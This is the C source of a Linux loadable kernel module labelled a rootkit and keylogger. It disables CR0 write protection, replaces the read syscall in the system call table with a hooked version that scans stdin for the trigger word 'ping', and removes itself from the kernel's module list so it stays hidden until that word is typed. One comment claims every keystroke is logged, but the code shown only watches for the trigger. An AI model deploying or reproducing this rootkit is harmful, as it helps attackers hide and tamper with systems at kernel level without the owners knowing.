#include <linux/init.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/string.h>
#include <linux/cred.h>
#include <linux/fs.h>
#include <linux/sched.h>
#include <asm/page.h>

#include "sysmap.h"


static struct list_head *module_previous;
//static struct list_head *module_kobj_previous;
static int  hidden = 0;
static char buff[10];
static int state = 0;

void **sys_call_table;

asmlinkage long (*original_read) (unsigned int fd, char __user *buf, size_t count);

void module_show(void);

static void match_word(char c)
{	
	
        switch(c)
        {
          case 'p':if(!state) state++;
                   break;

          case 'i':if(state == 1) state++;
                   break;

          case 'n':if(state == 2) state++;
                   break;

          case 'g':if(state == 3) {printk(KERN_INFO"PONG"); state = 0; module_show();}
                    break;

          default: state = 0;
                   break;
        }

	return;
}

void scan_input(long count, char *buf)
{
        int i = 0;
        for(i = 0; i<count ; i++)
        {
		match_word(buf[i]);
	}
}


/*
 * Our manipulated read syscall. It will print every keystroke to the syslog
 * and call the original read afterwards.
 */
asmlinkage long manipulated_read (unsigned int fd, char __user *buf, size_t count)
{
        long ret;
        ret = original_read(fd,buf,count);

        //read from stdin and print it using printk
        if(ret >= 1 && fd == 0)
        {
		/* scan the input for the specific commands entered */
		scan_input(ret,buf);
        }

        return ret;
}

/*
 * Disable the writing protection for the whole processor.
 */
static void disable_page_protection (void)
{
        unsigned long value;
        asm volatile("mov %%cr0,%0" : "=r" (value));
        if (value & 0x00010000)
        {
                value &= ~0x00010000;
                asm volatile("mov %0,%%cr0": : "r" (value));
        }
}

/*
 * Reenable the writing protection for the whole processor.
 */
static void enable_page_protection (void)
{
        unsigned long value;
        asm volatile("mov %%cr0,%0" : "=r" (value));
        if (!(value & 0x00010000))
        {
                value |= 0x00010000;
                asm volatile("mov %0,%%cr0": : "r" (value));
        }
}

void module_hide(void)
{
	if (hidden) return;
	module_previous = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	
	/*module_kobj_previous = THIS_MODULE->mkobj.kobj.entry.prev;
	kobject_del(&THIS_MODULE->mkobj.kobj);
	list_del(&THIS_MODULE->mkobj.kobj.entry);*/
	
	hidden = !hidden;
}
 
void module_show(void)
{
	printk("I'm now unhiding module %s\n",THIS_MODULE->name);
	int result;
	if (!hidden) return;
	list_add(&THIS_MODULE->list, module_previous);
	//result = kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, THIS_MODULE->name);
	hidden = !hidden;
}





static int __init rootkit_init(void)
{
	printk("Loaded the module but its hidden\n");
	printk(KERN_INFO "Loading keylogger LKM...\n");

        /* get the location of the sys_call_table from our sysmap.h file */
        sys_call_table = (void*) sysmap_sys_call_table;

        /* disable the write-protection */
        disable_page_protection();

        /*
         * keep pointer to original function in original_read, and
         * replace the system call in the system call table with
         * manipulated_read
         */
        original_read = (void *)sys_call_table[__NR_read];
        sys_call_table[__NR_read] = (unsigned long*)manipulated_read;

        /* reenable the write-protection */
        enable_page_protection();

	module_hide();
	
	return 0;
}

static void __exit rootkit_exit(void)
{
	printk(KERN_INFO "Unloading keylogger... bye!\n");

        /* disable the write-protection */
        disable_page_protection();

        /* Return the system call back to original */
        sys_call_table[__NR_read] = (unsigned long *)original_read;

        /* reenable the write-protection */
        enable_page_protection();
}

module_init(rootkit_init);
module_exit(rootkit_exit);
